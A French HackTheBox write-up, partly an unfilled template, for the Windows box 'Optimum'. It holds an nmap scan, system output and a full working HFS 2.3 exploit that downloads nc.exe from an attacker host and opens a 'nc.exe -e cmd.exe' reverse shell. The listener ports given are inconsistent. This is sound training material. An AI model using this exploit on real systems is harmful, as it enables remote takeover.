# Optimum — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-__-__ |
| **Vecteur** | <foothold : à compléter> → <privesc : à compléter> |
| **CVE** | CVE-2024-23692 (Template Injection / RCE) |
| **Tags** | windows · web · privesc-noyau |

> Remplacer `<IP_CIBLE>` par l'IP de ta session. tun0 = `10.10.14.x` · cible = `10.129.x.x`.

> 🎯 **Objectif : ta 1re privesc Windows.** Comme Shocker : tu entres en compte
> **non privilégié**, puis tu escalades. Foothold ≠ SYSTEM.

---

## TL;DR

<À remplir en fin de box.>

---

## 1. Reconnaissance

```bash
┌──(kali㉿kali)-[~/Téléchargements]
└─$ nmap -sC -sV -p- -oA optimum <IP_CIBLE>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-28 14:34 +0200
Nmap scan report for <IP_CIBLE>
Host is up (0.053s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.45 seconds

```

| Port | Service | Version | Piste |
| --- | --- | --- | --- |
| 80 | HTTP | HttpFileServer httpd 2.3 | httpd 2.3 |

> Peu de ports. Note **précisément la version** du service exposé — c'est la clé de l'accès initial.

---

## 2. Accès initial (foothold)

**Méthode :** version du service → recherche d'exploit public (`searchsploit` / web) → lire, adapter, lancer.

- Service & version ciblés : `httpd 2.3`
- Exploit retenu (source, EDB-ID / CVE) : `CVE-2024-23692`
- Adaptations faites (LHOST/LPORT, payload…) : `______`

```bash

cp /usr/share/windows-resources/binaries/nc.exe .

python3 -m http.server 80

nc -lvnp 4444

[ Ta Kali ]                                   [ Cible Windows ]
nc.exe dans le dossier                        exécute (via l'exploit) :
python3 -m http.server 80   ───(HTTP)────►    certutil / powershell
   « je sers nc.exe »                          « je télécharge http://10.10.14.x/nc.exe »
                                                     │
nc -lvnp 443   ◄──────(reverse shell)──────────────┘
   « j'écoute »                                nc.exe -e cmd.exe 10.10.14.x 4444

python2 39161.py <IP_CIBLE> 80


```
# script python utilisé

```python
import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""

```


- **Utilisateur obtenu :** `kostas` (⚠️ pas SYSTEM)

**Flag user :** desktop de l'utilisateur (non publié).

---

## 3. Énumération privesc (Windows)

Dérouler `windows-privesc` AVANT d'exploiter.

```powershell
whoami /priv
systeminfo            # version, architecture, correctifs (KB) installés
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          5/10/2026, 3:40:35 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.521 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.960 MB
Virtual Memory: In Use:    543 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.

```

Outils au choix : winPEAS, Seatbelt, ou un script d'énumération de correctifs manquants.

- Piste retenue : `______`

---

## 4. Élévation de privilèges

**Méthode :** identifier ce qui manque côté correctifs / configuration → choisir la technique adaptée → l'exécuter proprement.

```powershell
# à compléter
```

- **Résultat :** `nt authority\system`
- Pourquoi cette technique fonctionne (pour l'oral) : `______`

**Flag root :** desktop Administrateur (non publié).

---

## 5. Remédiation

- <correctif foothold>
- <correctif privesc>
- <durcissement transverse>

---

## 6. Côté Blue Team — détection

| Étape | Trace / Event | Détection |
| --- | --- | --- |
| foothold | | |
| privesc | | |

---

## 7. Leçons

- <ce que cette box apprend de neuf vs Shocker>
- <piège / temps passé>

---

## Références

- <exploit / write-up>
- Fiches liées : [nmap](../outils/nmap.md) · [searchsploit](../outils/searchsploit.md) · [windows-privesc](../outils/windows-privesc.md) · [reverse-shells](../outils/reverse-shells.md)
